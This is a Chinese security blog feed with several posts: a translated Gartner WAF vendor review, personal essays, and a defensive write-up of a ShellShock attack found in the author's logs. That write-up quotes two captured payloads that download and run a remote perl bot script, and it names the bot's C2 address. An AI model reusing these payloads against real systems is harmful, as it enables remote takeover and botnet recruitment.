<li>飞塔使用硬件设备实现SSL加解密加速。产品性能的文档非常直接，每种部署方式飞塔的渠道都有详细帮助。</li>
<li>客户购买飞塔waf往往是用他的反病毒引擎检测文件共享服务上的恶意软件。Gartner预计，集成沙箱后会进一步提高这种使用场景的实用性。</li>
<li>飞塔包含完整的漏洞扫描，带外管理模式，相当数量的预定义报告模板。</li>
<li><p>飞塔还有一系列不错的特性，比如自动学习模式，ip信誉，cookie标记，SSL加速，web应用缓存，机器人识别。<br>劣势</p>
</li>
<li><p>相较于安全网关，waf只是飞塔的二级产品，渠道销售的积极程度并不高。Gartner认为，本地技术技能可用性比那些与网络防火墙要可怕。</p>
</li>
<li>客户反馈在普通环境中部署waf后需要很长时间来调整，以避免误报。</li>
<li>飞塔并没有在他们的应用交付产品中提供WAF功能。也没有在云服务中提供waf功能。对于安全意识较强的组织，厂商并没有提供硬件安全模块集成或基于云的ddos防护。</li>
<li>waf与其他飞塔产品的集成也很有限，除了统一的日志分析模块外，这对于飞塔客户来说限制了收益。</li>
<li>飞塔的waf大多出现在为满足合规要求时。</li>
</ul>
<p>Imperva<br>英普华位于加州，拥有很长的WAF产品线。其他产品聚焦在数据安全，例如数据库审计、数据库防火墙，文件监控，应用层DDOS防护，云计算保护。还有两个包用于安全监控和管理。</p>
<p>早期英普华产品以透明桥方式部署。这与企业保持一致，因为这种部署方式更容易被应用在应用交付产品之后，而不引入第二级代理，而且产品测试时更容易。其他竞争对手被收购或消失，英普华在这个领域持续增长。</p>
<p>英普华Incapsula是基于云计算的waf，被集成在其他服务中，比如DDOS防护。ThreatRadar是附加订阅服务，包含四种功能：信誉库，反僵尸，反欺诈，社区防御。以虚拟化应用的形式可以在AWS上部署waf，七层流量高达10Gbps。物理形态和虚拟化形态都可提供专用管理。</p>
<p>Gartner看到英普华WAF很棒的攻击检出率，厂商还提供了良好的第三方生态系统，包含DLP，反欺诈，SIEM和漏洞扫描。</p>
<p>英普华被评为”领导者“，他们的安全特性和创新处于领先水平，价格方面与竞争对手不相上下。英普华对于各个级别的组织都是非常好的候选厂商，尤其是高安全级别要求的客户，或者寻找易部署、基于云的waf的客户。</p>
<p>优势</p>
<ul>
<li>Gartner看到英普华一贯得分很高表现亮眼，以高效率防护，良好的报告，而不是检测率，在Gartner的客户中赢得了出色评价。在售后服务方面，客户反馈也很好。</li>
<li>英普华持续领跑WAF市场，发布新的功能，迫使竞争对手跟随作出反应。这还包括一些防护效果更好的高级技术，这是竞争对手所不具备的。因此，当你需要寻找与应用交付不同供应商，且对防护效果非常看重时，这是一家很好的备选供应商。而有些客户使用英普华的“manager of manager”选项，这也说明产品曾部署在大型案例中。</li>
<li>供应商一直在努力且有效的传达一种讯息，WAF可以用来响应数据中心的应用层威胁状态，例如集成 Incapsula WAF 和Skyfence CASB实现。英普华在对web攻击的研究与威胁报告方面一直做的非常棒。</li>
<li>通过waf即服务的Incapsula，和本地部署的SecureSphere，英普华在商业客户和中小客户中占据了大量市场。当客户的应用安全需要改变时，这也为他们提供了一个新的选择：英普华。</li>
<li><p>英普华本地部署的waf，在客户的评价非常好，因此也在以此对抗云端waf。<br>劣势</p>
</li>
<li><p>作为优质商业产品，英普华通常对于中小客户和部署waf只为应对合规检查的项目来说太高端了。而价格是客户选择其他waf解决方案的主要原因。当有应用交付类厂商参与竞争时，这一点尤其如此。</p>
</li>
<li>尽管英普华在安全能力上被评为得分最高，英普华仍然面对来自应用交付类厂商最多的竞争。而他们往往已经在客户那里成功部署了一些产品，只需再买一个授权key就能实现waf的功能。这类客户并不愿为此多花一大笔钱。</li>
<li>英普华的渠道与销售团队经常相客户兜售数据库安全集成解决方案，这给客户们带来了一定压力，这也会造成web安全项目总价过高。同时，由于需要不断与数据和网络相关人员讨论并展示一些收益，这也延长了采购周期。</li>
<li>客户反馈偶尔管理控制台会失效，尤其是部署了应用集群时。</li>
<li>英普华目前只支持aws一个云计算平台，而其他竞争对手往往支持更多的云平台。</li>
</ul>
<p>绿盟科技<br>绿盟是一家中国北京的公司，起步于2000年，最早提供抗DDOS解决方案。后来延伸了产品线，包含IPS，漏洞扫描。waf最早发布于2007年。可以物理设备或虚拟化版本交付，可部署为反向代理、透明代理模式，支持带外管理。绿盟同时提供了一套集中管理软件，用于管理waf产品。</p>
<p>供应商最近宣布支持IPv6，并发布面向中端市场的高端waf产品。</p>
<p>绿盟被评为“特定领域者”，他们市场聚焦在亚太地区。对于中国的大中小型客户，和已购买绿盟产品的客户来说，这是一家不错的备选供应商。</p>
<p>优势</p>
<ul>
<li>客户选择绿盟的waf，经常反馈他们有竞争力的价格和性能，尤其是低延迟，这是有决定性的因素。绿盟最近专门为日本客户新增了一种区域性GUI界面。</li>
<li>当检测到网络拥塞时，waf可以把入站流量重定向到绿盟的抗DDOS设备过滤后再回流。</li>
<li>waf拥有很不错的本地与全球产品认证，包括ICSA实验室的waf认证。</li>
<li><p>waf可以和她们家自己的漏洞扫描产品集成。<br>劣势</p>
</li>
<li><p>在中国以外区域，绿盟知名度较低。他的国际渠道的技术投资仍旧落后于其他产品。这也限制了当地技术能力的支持。</p>
</li>
<li>在一些企业级功能上，绿盟的waf一直落后于“领导者”级别的企业。比如有限的基于角色的管理，主主集群也限定为两台设备，没有ssl加速。</li>
<li>绿盟的waf不提供身份认证功能。</li>
<li>客户反馈自学习功能本可以更容易微调的。</li>
<li>虽然绿盟的waf可以与自家的漏洞扫描集成，但是，目前为止并不能与其他第三方SIEM或者漏洞扫描集成。</li>
</ul>
<p>Radware</p>
<p>radware是一家以色列特拉维夫的公司，主要提供应用交付和安全产品。他们的安全产品包含混合型DDOS防护工具（DefensePro），ddos保护虚拟设备（DefenseFlow），ddos保护管理服务（DefensePipe）和waf。产品可以单独购买，也可以与AMS集成在一起。他们的waf发布与2010年。可以物理设备或虚拟机形态提供。产品可以集中管理，监控与报告解决方案。</p>
<p>自从2014年，radware并没有为waf发布新的型号。他们提供更新的服务，包括基于云的全面管理和WAF的内部部署全面管理WAF服务。同时提供waf的带外管理部署方式。</p>
<p>Gartner评价radware为“特定领域者”，因为他们尽管最近很努力，仍然是服务于大中型企业客户。</p>
<p>优势</p>
<ul>
<li>在其他的部署方案，AppWall可在透明网桥模式，同时提供反向代理功能，以特定的流量进行部署。通过自学习功能，waf很容易部署，而且无需修改网络配置。</li>
<li>选择他们的主要两个原因，一是价格，二是考察客户安全性。</li>
<li>radware的waf控制台包含强大的多租户功能，并集成了认证与单点登录模块。</li>
<li><p>在过去三年中，他们坚持自己的路线图在反战，相比这一象限其他供应商来说，他们展示了坚定的承诺与执行力。<br>劣势</p>
</li>
<li><p>不能与第三方漏洞扫描和数据库安全解决方案相集成。</p>
</li>
<li>waf仍旧是应用交付平台的一个模块，与其他竞争对手来说这是个劣势。</li>
<li>知名度较低，只在很少的几个客户中提到。</li>
</ul>
<p>——————-分割线—————</p>
<p>最后附上报告英文原文：<a href="http://ob7tq8bas.bkt.clouddn.com/Magic%20Quadrant%20for%20Web%20Application%20Firewalls.mht" target="_blank" rel="external">点击下载</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;工作原因，最近开始研究主流市场的各类WAF产品。Gartner的魔力象限分析是必不可少的重要材料。节选了部分2015年度WAF领域的报告翻译了出来，给自己存个档。&lt;/p&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="Fortinet" scheme="http://www.lewisec.com/tags/Fortinet/"/>
    
      <category term="Gartner" scheme="http://www.lewisec.com/tags/Gartner/"/>
    
      <category term="Imperva" scheme="http://www.lewisec.com/tags/Imperva/"/>
    
      <category term="waf" scheme="http://www.lewisec.com/tags/waf/"/>
    
      <category term="魔力象限" scheme="http://www.lewisec.com/tags/%E9%AD%94%E5%8A%9B%E8%B1%A1%E9%99%90/"/>
    
  </entry>
  
  <entry>
    <title>盘点2015</title>
    <link href="http://www.lewisec.com/2016/01/09/my2015/"/>
    <id>http://www.lewisec.com/2016/01/09/my2015/</id>
    <published>2016-01-09T09:41:13.000Z</published>
    <updated>2016-08-07T15:05:54.728Z</updated>
    
    <content type="html"><![CDATA[<p>每年的第一天都要盘一盘过去的这一年，这是多年的习惯了。</p>
<p>今年因为家庭，因为工作，拖到现在才盘点，也是真有点说不过去。还是回顾自己在过去一年读过的书吧，算是画个句号。</p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/2015.jpg" alt="" title="2015">这是在<a href="http://readingtaste.com/" target="_blank" rel="external">http://readingtaste.com/</a> 统计出，我使用豆瓣标记的读书记录。猛一看，自己都有点吃惊。没想到阅读速度会这么快，而这个阅读总量也是历年最大了。后来仔细想了想，这里是有出入的。2014年底读的6本书，我是在2015年1月份才在豆瓣上标记和评论的，也被包含在内了。准确数字应该是23本。比去年多了一本。略微有进步。</p>
<p>今年读书不仅限于纸质书，也开始在移动端看电子书了。最开始是用豆瓣阅读看看知乎周报一类的杂志，后来开始用京东阅读app看电子书。京东阅读有一个很赞的功能，畅读。每个月花上5元钱，书城的各类书都可以随意看，但是不能下载和保存。其实相当于花5元钱去京东的图书馆里借阅的意思。这样就不用担心买回来的书不喜欢了。看过一遍之后，确实喜欢，才去买一本实体书读第二遍、第三遍，吸收的内容也更充分。通过这个app，我看完了《打造Facebook》、《文武北洋》、《台湾往事》。这些还不算在总的阅读记录里。</p>
<p>选几本五星推荐的书列出来吧。</p>
<p>1.《茶之路》 ☆☆☆☆☆</p>
<p>这本书沿着一年茶叶制作的路线，跑遍了中国几乎全部茶叶产区，历数了绿、白、黄、青、红、黑六大茶类各个代表茶叶的种植、采摘、制作工艺和品评特点。穿插了种茶人和制茶人的故事。所以不要以为这是一本专业著作，其实一点都不枯燥，知识性非常强，干货满满，读起来还非常轻松愉快。</p>
<p>我一向认为，喜欢一样东西，无论是喝茶还是玩手串，都要搞明白搞细致搞透彻了，这才是真正的玩。泛泛的“好喝、好听、好看”，那个层次未免太浅了。这本书就是一本爱茶人的必备宝典。</p>
<p>2.《美国宪政历程– 影响美国的25个司法大案》☆☆☆☆☆</p>
<p>在网上经常看到有人推荐有关美国政治的书，都会推荐林达的《近距离看美国》系列，或者刘瑜的《民主的细节》，但这本大部头很少有人提及。幸运的是，我先看了这本书，才又看了那两本。什么感觉？有一种“这事儿我都知道了，能不能聊点新鲜的”感觉。</p>
<p>《美国宪政历程》，几乎是把美国宪法历史上的重大修正的来龙去脉说的非常清楚了。透过这些案子和过程，你就能很清楚的明白为什么美国的政体是那样的。三权分立究竟是怎么玩的，自由与民主发生碰撞时老美是怎么机智的处理，百姓选举是怎么自下而上维持政府运转的。那两本算是通俗读物吧，能让你知其然。而这本书，更可以让你知其所以然。</p>
<p>3.《最近四十年中国社会思潮》☆☆☆☆</p>
<p>看完一大圈别人家的事儿，也得回过头看看自家。什么是民粹，什么是毛左，什么是新儒家。为什么政府不待见毛左。这些问题曾经困扰我很久。看完这本书，问题基本上有了答案。作者把改革开放以来，社会上最常见的八种思潮依次做了分析。当然，作者是坚定的邓派理论支持者，不然也不会给出版。所以难免在讨论新旧左派、自由派时，会有一些情绪上的倾向性。这也是我扣掉一颗星评价的原因。</p>
<p>我的体会是，只有知道了那个群体的核心诉求是什么，以及这种思想诉求的来源，才能有效率的和对方沟通。除了新儒家以外，我觉得每一种思潮都有可取之处，都不能一概而论的说，这是错误的，这是不好的。</p>
<p>唯一的困惑是，我曾以为自己是自由主义的支持者，看完书之后反而有了一些怀疑。自由主义太过于强调削弱政府作用，会不会形成马太效应？会不会不够公平？</p>
<p>4.《最后的耍猴人》☆☆☆☆</p>
<p>这本书不多评价了，作者把自己看到的、听到的有关耍猴艺人这个群体的故事，全部用文字和大量照片记录下来了，翻开这本书，你就可以接近那个即将消失的群体，了解和触摸他们曾经的生活。</p>
<p>技术类的书籍，2015年看的不太多，读完的有《图解HTTP》、《Wireshark网络分析就这么简单》。还有两本看了一半的，惭愧惭愧。为了应付考试还看了两本教材，但这不算阅读，不计算在内。</p>
<p>宗教类今年看的也不多，只详细看完了《掌中解脱》这两本。这一年可能是最不精进的一年了，因此心灵上的痛苦也是最多的一年。</p>
<p>2016年已经过去了9天，相信这将是不平凡的一年。几个心愿，开列一下，年底来回顾。</p>
<p>1.已经在看CISSP AIO第六版了 ，希望今年可以通过这个考试。</p>
<p>2.Linux、Mysql、Python我同时在各看一本书自学，希望今年能在这三个领域有点收获。</p>
<p>3.今年会有一个项目做，希望顺利做完，别出幺蛾子。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每年的第一天都要盘一盘过去的这一年，这是多年的习惯了。&lt;/p&gt;
&lt;p&gt;今年因为家庭，因为工作，拖到现在才盘点，也是真有点说不过去。还是回顾自己在过去一年读过的书吧，算是画个句号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ob7tq8bas.bkt.clouddn.c
    
    </summary>
    
      <category term="读书笔记" scheme="http://www.lewisec.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>网络安全公司网屏（NetScreen）的研究</title>
    <link href="http://www.lewisec.com/2015/12/31/netscreen/"/>
    <id>http://www.lewisec.com/2015/12/31/netscreen/</id>
    <published>2015-12-31T06:43:05.000Z</published>
    <updated>2016-08-07T15:08:02.498Z</updated>
    
    <content type="html"><![CDATA[<p>刚刚在<a href="http://www.valleytalk.org/" title="弯曲评论" target="_blank" rel="external">弯曲评论</a>看到这份分析NetScreen的文档，内容翔实，值得研究。</p>
<p>作为华人在硅谷创业成立的安全公司，NetScreen是第一家，也是具有丰碑意义的一家。</p>
<p>至今国内做安全网关设备厂家的研发团队里，都还能看到出自当年那个叱咤风云的NetScreen团队的精英。</p>
<p>下载：<a href="http://ob7tq8bas.bkt.clouddn.com/file%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E5%8F%B8%E7%BD%91%E5%B1%8F%EF%BC%88NetScreen%EF%BC%89%E7%9A%84%E7%A0%94%E7%A9%B6%EF%BC%88%E7%A8%BF%EF%BC%89.pdf" title="netscreen" target="_blank" rel="external">传送门</a></p>
<p>原文：<a href="http://www.valleytalk.org/2015/12/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E5%8F%B8%E7%BD%91%E5%B1%8F%EF%BC%88netscreen%EF%BC%89%E7%9A%84%E7%A0%94%E7%A9%B6/" target="_blank" rel="external">传送门</a></p>
<p>以此作为2015年博客的最后一篇纪念吧。</p>
<p>预祝各位2016年步步高升！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚刚在&lt;a href=&quot;http://www.valleytalk.org/&quot; title=&quot;弯曲评论&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;弯曲评论&lt;/a&gt;看到这份分析NetScreen的文档，内容翔实，值得研究。&lt;/p&gt;
&lt;p&gt;作为华人在硅谷创
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="netscreen" scheme="http://www.lewisec.com/tags/netscreen/"/>
    
  </entry>
  
  <entry>
    <title>偶遇BASH攻击，险入僵尸网络</title>
    <link href="http://www.lewisec.com/2015/12/01/bash-botnet/"/>
    <id>http://www.lewisec.com/2015/12/01/bash-botnet/</id>
    <published>2015-12-01T12:25:13.000Z</published>
    <updated>2016-08-06T16:01:37.125Z</updated>
    
    <content type="html"><![CDATA[<p>上个月分析系统日志时，意外发现一例利用BASH ShellShock漏洞的攻击，研究起来挺有趣，写出来做个记录。</p>
<a id="more"></a>
<p>每隔几天都会看一看边界安全设备的日志，看看都拦下来哪些攻击，有没有漏掉的。10月12号起，拦截了不少利用BASH ShellShock漏洞的攻击数据。攻击源地址几乎遍布全球，攻击目的地址覆盖了公司公布在互联网的所有业务系统，而且发起的时间没有什么规律。唯一显著的特点是，攻击者在短时间内发起攻击的次数比较多，可以判断肯定不是手工操作的。于是，从攻击频率入手分析，兴许能发现点什么。</p>
<p>我把所有这个类型的攻击日志按源地址分组后，再按发起时间做了排序，果然发现一个规律。每个攻击IP发起每轮攻击，基本上都以31次为固定频率，每轮平均耗时15秒。</p>
<p>我又开nmap扫了一下这些攻击源IP，基本上都是世界各地的服务器，跑着各类web应用。按常识，不应该是这些服务器的管理员发起的对我们的攻击，很可能是被黑客当作肉鸡或跳板之后，被黑客当作了攻击工具。</p>
<p>为了弄清楚攻击的全貌，我在边界设备上开始抓包，希望能从攻击数据包里发现一点有价值的信息。抓到一些pcap包之后，用wireshark打开。</p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/bash1.jpg" alt="" title="bash1"></p>
<p>注意看，在http包里面，ua字段里插入了破壳漏洞的攻击代码：</p>
<p>() { :;};/usr/bin/perl -e ‘print “Content-Type: text/plain\r\n\r\nXSUCCESS!”;system(“wget -O /dev/null <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; curl -O /dev/null <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; fetch <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; GET <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; lwp-download <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; lynx <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>“);’</p>
<p>另外的一个攻击IP发过来的和这个几乎一模一样：</p>
<p>() { :;};/usr/bin/perl -e ‘print “Content-Type: text/plain\r\n\r\nXSUCCESS!”;system(“wget <a href="http://tecnoalianza.com/a.log" target="_blank" rel="external">http://tecnoalianza.com/a.log</a> -O /tmp/a.log;curl -O /tmp/a.log <a href="http://tecnoalianza.com/a.log;perl" target="_blank" rel="external">http://tecnoalianza.com/a.log;perl</a> /tmp/a.log;rm -rf /tmp/a.log*”);’</p>
<p>攻击者如果利用漏洞成功，就会在我的服务器上从指定的服务器下载一份文件到本地，从格式上看，应该是一份用perl写的脚本。然后在服务器运行这段脚本，接着删除掉。攻击代码并不复杂，长度也比较短，利用起来很方便。</p>
<p>接着，我把<a href="http://tecnoalianza.com/a.log" target="_blank" rel="external">http://tecnoalianza.com/a.log</a> 这份文件下载回来，准备研究一下这个脚本，不出意外的话，应该会是一个小木马。没想到刚下载到就被卡巴斯基识别为病毒文件-_-!!</p>
<p>打开这份文件，果然是用perl写的代码。从编写习惯来看，作者写代码还是非常规矩的，对齐、注释，一点也不马虎大意。接近1900行代码，因为没学过perl，读起来还是有一点吃力。大致的功能是，连接cc服务器并回传当前服务器的一些基本信息。接着从cc服务器获取指令，包含有一个ip信息。然后针对这个ip发起常见端口扫描、tcpflood、udpflood等等攻击。</p>
<p>也就是说，如果我的服务器没有打bash的补丁，被shellshock攻击成功后，会下载一个perl脚本，攻击者就可以控制我的服务器，再去攻击其他的计算机。</p>
<p>在perl脚本里，找到了cc服务器的ip：是乌克兰的213.186.118.35</p>
<p>忍不住又用nmap看了下大致情况：</p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/bash2.png" alt="" title="bash2"></p>
<p>注意看我红圈标注的内容。有没有很喜感。^_^</p>
<p>11月中旬以来，类似的攻击突然就销声匿迹了。就好像发起时候来的那般突然。</p>
<p>总结：</p>
<p>1.该打补丁的时候千万别懒，今天一偷懒，明天就坑爹。</p>
<p>2.是时候学学perl了。</p>
<p>3.如果服务器有杀毒软件，还是可以起到一定作用的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上个月分析系统日志时，意外发现一例利用BASH ShellShock漏洞的攻击，研究起来挺有趣，写出来做个记录。&lt;/p&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
  </entry>
  
  <entry>
    <title>《十二公民》，一部好看的“有教育意义”的片子</title>
    <link href="http://www.lewisec.com/2015/10/11/twelve-citizen/"/>
    <id>http://www.lewisec.com/2015/10/11/twelve-citizen/</id>
    <published>2015-10-11T07:18:09.000Z</published>
    <updated>2016-08-07T15:18:49.213Z</updated>
    
    <content type="html"><![CDATA[<p>昨天在电影院看完《夏洛特烦恼》，今天在家看完《十二公民》，瞬间感觉电影票钱奉献错了。</p>
<p>不是说《夏洛特烦恼》有多不好，而是像《十二公民》这样的好片子，应该得到高票房和高度认可。所以写下这篇不算影评的文字。</p>
<a id="more"></a>
<p>故事很简单，法学院的学生要补考英美法课程，需要审理一件富二代杀父的案件，不同社会角色的家长们组成陪审团，在听取学生法庭审理后，将对本案做出最终“判决。众多证据都指向嫌疑人有罪，只有陪审团做出12票全部通过的决议，学生们才算补考通过。陪审团从11：1的局势开始，围坐在一个仓库里开始激烈讨论，最终扭转判断认定嫌疑人无罪。</p>
<p>故事不复杂，场景也极其单一，几乎完全在一个场景里拍完了整部电影。能在几乎唯一的场景里拍完整部片子，而且不枯燥，吸引人看完，还觉得意犹未尽，这种功夫比市面上看到的绝大部分耗费千万制作出来的爆米花大电影，出色的不止一点半点。</p>
<p>当然，导演和众多演员本就是话剧演员出身，这是一个很重要的因素，但如果这样的片子能让观众对话剧产生兴趣，对这种越来越小众的艺术形式产生好奇，这就能让我为导演和主创们鼓掌。</p>
<p>尽管老头那个角色有些台词有些表演话剧味儿重了一些，相对于电影来说，有点出戏。但这种失误，恐怕要远远好于那些唐宋代的人拿着盖碗喝茶的穿帮。</p>
<p>看过电影的人中间，如果能有一半的观众明白无罪推定的意义，体会到冷静而独立思考的价值，这就足以支撑整部片子的意义。</p>
<p>我们总能看到法制社会建设的不足，这和公民普遍法治意识的缺位有密不可分的关系。也只有全社会、大部分公民受到一次又一次法制观念的熏陶，真正在心里有了法制的思维方式，这个社会的法制建设才有了足够的土壤。从这个角度，给这部电影1024个赞，不过分。</p>
<p>所以，不要说什么“在中国拍这种英美法律题材”没有意义，恰恰相反，通识性的知识普及，才最有意义。</p>
<p>人物的刻画上，老戏骨们的表演近乎完美，何冰捡起地上纸团时颤抖的双手，韩童生激动时抽搐的面部肌肉，比其他娱乐大片里假模假样的梨花带雨，不知道要高级多少倍。吃瓦片的房东在地域攻击之后发现得罪了更多人，为了不被孤立赶紧往回找补的样子，相信有过类似生活体验的人一眼就能看出来，对，那个情况下的人，就应该是那种表现。还有小卖铺的老板，演员钱波曾在电视剧《茶馆》里饰演唐铁嘴，也是一个嘴皮子利索的市侩，一个眼神一句台词，都能让人想起自家楼下的那个小老板。</p>
<p>我们不能要求每个配角都飙戏飙出风采，话不多的配角们没有一个掉链子糊弄事儿的，几乎挑不出毛病。</p>
<p>台词写的非常流畅，逻辑推理也严丝合缝。场景太过单一，无法用多种镜头和环境塑造事件，所以只能用精彩的台次表现冲突，而这部片的台词把每个角色由有罪说服到无罪的过程里，让人信服。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨天在电影院看完《夏洛特烦恼》，今天在家看完《十二公民》，瞬间感觉电影票钱奉献错了。&lt;/p&gt;
&lt;p&gt;不是说《夏洛特烦恼》有多不好，而是像《十二公民》这样的好片子，应该得到高票房和高度认可。所以写下这篇不算影评的文字。&lt;/p&gt;
    
    </summary>
    
      <category term="七零八落" scheme="http://www.lewisec.com/categories/%E4%B8%83%E9%9B%B6%E5%85%AB%E8%90%BD/"/>
    
    
  </entry>
  
  <entry>
    <title>逛书店</title>
    <link href="http://www.lewisec.com/2015/08/16/bookshop/"/>
    <id>http://www.lewisec.com/2015/08/16/bookshop/</id>
    <published>2015-08-16T02:59:44.000Z</published>
    <updated>2016-08-06T16:04:21.892Z</updated>
    
    <content type="html"><![CDATA[<p>公司发福利，200多元的购书券，指定在新华书店购书中心消费。刚拿到购书券的时候，我其实是高兴的。每年买书至少十几本，有了购书券至少可以剩下一笔钱嘛。</p>
<p>上次进书店还是三年前，坐火车回家之前有大块空余时间，一个人溜达到附近的购书中心打发时光，然后发现了讲ISO27001的那本指南，如获至宝。那本书给我后来的工作帮助不小，不过最后我还是在网上下的单。</p>
<p>昨天体验了一次实体店购书，着实把我累够呛，我也理解了为什么电商对书店的冲击这么大。</p>
<a id="more"></a>
<p>在实体店买书巨累！<br>实体店越来越少，去一次来回坐车都要一个多小时，三十多度的高温考验着买书的决心。网购的话，点点鼠标就ok。这种便利性是影响我去实体店买书的首要原因。</p>
<p>在实体店找书巨累！<br>上下五层，要找自己想要的书，先去查询机搜。还只能按书名搜。搜出来只告诉一个书架编号，得自己跑着找这个架子。你就不能给个平面示意图吗？那么多架子，编号还印刷的小，找到也是够费劲！</p>
<p>在实体店买自己想要的书巨难！<br>查询系统只能按书名搜，输入《论中国》，结果出来一堆XXX论中国XXX的结果，超出50条的部分还不予显示。购书单上至少有三本书店压根就没有货。习惯了网购便利快捷的搜索，这种体验实在让人崩溃。</p>
<p>如果你不是有目的购书，习惯于在书店逡巡，随便拿一本翻翻就买买买的感性消费者，书店还是有自己的便利。但对于我这种目标性非常明确，拿着购书单去买书的人来讲，去实体店买书就是自己找罪受。</p>
<p>书店生意显然不容乐观，有些柜台已经改为了运动服饰品牌店。童书楼层还开辟一大块面积租给了卖学习机的、卖儿童书桌的店面。书店客流量不算小，但收银台却压根不需要排队。说白了，看的人多买的人少呗。没有桌椅就席地而坐，没有咖啡就自带水杯。还有家长带着孩子去读绘本的，注意，是读。我多想提醒他们，其实有个地方，叫做图书馆。</p>
<p>也许，以后女儿大了，我也会带她去书店。不过不是让她去蹭书看。那种人人看书、人人喜欢书的氛围是电商永远也给不了的。各类包装精美的书摆在眼前，总会有一种买买买的冲动。我希望这样可以培养孩子爱上阅读的习惯。给她两百块钱，陪着她逛逛，由着她随便拿几本有眼缘的书回家，这就够了。至于书的质量是不是足够好，内容是不是足够优秀，这倒是其次。不多看点烂书，哪能锻炼出来找好书的本事呢。不翻翻不同类型的书，哪能找准自己的口味呢。</p>
<p>所以，希望书店坚持开下去！开的更好！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;公司发福利，200多元的购书券，指定在新华书店购书中心消费。刚拿到购书券的时候，我其实是高兴的。每年买书至少十几本，有了购书券至少可以剩下一笔钱嘛。&lt;/p&gt;
&lt;p&gt;上次进书店还是三年前，坐火车回家之前有大块空余时间，一个人溜达到附近的购书中心打发时光，然后发现了讲ISO27001的那本指南，如获至宝。那本书给我后来的工作帮助不小，不过最后我还是在网上下的单。&lt;/p&gt;
&lt;p&gt;昨天体验了一次实体店购书，着实把我累够呛，我也理解了为什么电商对书店的冲击这么大。&lt;/p&gt;
    
    </summary>
    
      <category term="七零八落" scheme="http://www.lewisec.com/categories/%E4%B8%83%E9%9B%B6%E5%85%AB%E8%90%BD/"/>
    
    
  </entry>
  
  <entry>
    <title>传统企业的IPS运维</title>
    <link href="http://www.lewisec.com/2015/07/30/%E4%BC%A0%E7%BB%9F%E4%BC%81%E4%B8%9A%E7%9A%84IPS%E8%BF%90%E7%BB%B4/"/>
    <id>http://www.lewisec.com/2015/07/30/传统企业的IPS运维/</id>
    <published>2015-07-30T03:50:02.000Z</published>
    <updated>2016-08-07T15:03:02.541Z</updated>
    
    <content type="html"><![CDATA[<p>这篇东西主要谈论传统行业公司的安全部门，在日常运维中针对IPS可能遇到的问题，以及个人经验总结。和互联网企业的安全运维并非一个范畴的东西，和传统企业的IT运维有明星区别。</p>
<a id="more"></a>
<p>传统行业的公司，与互联网公司的最大区别，在于主营业务和主营产品的不同。这是句废话。但这句废话直接决定了两种类型公司在面对安全问题的思路会有些许区别。互联网公司的产品就是互联网产品、网站系统，所以他们面对的互联网攻击数量更多，威胁也更丰富。加之互联网公司的员工绝大部分都是具备一定开发能力的程序员，根据目前我看到的情况来说，互联网公司在处理网络攻击时，更喜欢自建一套产品。一方面，自开发产品更能针对自己的业务特性和需要，另一方面，自开发产品可以更能满足互联网公司大流量高并发的需求，最后，成本也更容易控制。</p>
<p>传统行业公司不具备足够数量的高水平程序员，从能力上无法自建安全产品，从业务来讲，对外提供服务的web网站和B/S架构的系统数量少、流量低、并发小，适用人群大多很聚焦，例如数量清晰的上游供应商、人员明确的销售管理系统或售后服务系统等，大多都是业务支持系统，自建一套的必要性不是太大。更重要的一点是，传统企业更希望安全建设见效快维护量小，所以，购买成熟的IPS、FW、WAF等等盒子，是首选之路。</p>
<p>说完二者区别的简单认识，再来说点技术细节。</p>
<p>设备上线时，为了测试验证策略有效性与兼容性，启用了全部策略。这就导致每天被记录的攻击日志接近万条。看起来安全威胁很严重，但又总是和领导说不清楚主要威胁是什么，威胁了哪些业务系统，应该怎么进一步防护和加固。</p>
<p>从产品特性来说，IPS串行部署在网络出口，策略本身不可能太过严格，以防误报引起的业务中断。按道理说，IPS首要面对的，应该是漏报怎么发现如何解决。但面对一个月几十万条“攻击日志”的庞大数据，如果再加上漏报的数据分析，想要明确把握安全态势，就非常困难了。而且，能从IPS漏过的攻击，肯定都是经过精心设计的高级别的手法，处理方式也有别于最基本的攻击。</p>
<p>所以，我的思路是，先分析现有日志，处理设备误报的问题，把当前真实的攻击从浩瀚的日志里抽丝剥茧暴露出来，给出解决办法和加固方案。稳住基本盘之后，再来处理漏过的高级别攻击。</p>
<p>第一步，导出设备一月内的全部日志。这里就不得不吐槽下国产设备了。导出格式居然只支持txt一种！这还是市场占有率前三甲的某老牌公司的产品。在没有现成的SIEM的情况下，分析日志最有效的还是EXCEL啊。用EXCEL导入txt文件后，根据分隔符把每个字段单独成列。</p>
